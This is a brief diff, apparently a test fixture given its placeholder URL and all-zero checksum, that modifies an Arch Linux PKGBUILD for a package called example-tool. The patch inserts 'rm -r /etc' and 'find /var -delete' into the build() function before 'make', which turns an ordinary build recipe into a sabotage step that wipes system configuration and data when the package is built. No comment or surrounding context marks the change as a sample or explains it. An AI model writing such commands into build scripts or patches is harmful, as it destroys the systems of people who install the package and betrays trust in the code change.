@@ -1,0 +1,10 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -7,5 +7,7 @@
+ source=("https://github.com/example/example-tool/archive/v1.0.0.tar.gz")
+ sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')
+ build() {
++  rm -r /etc
++  find /var -delete
+   make
+ }
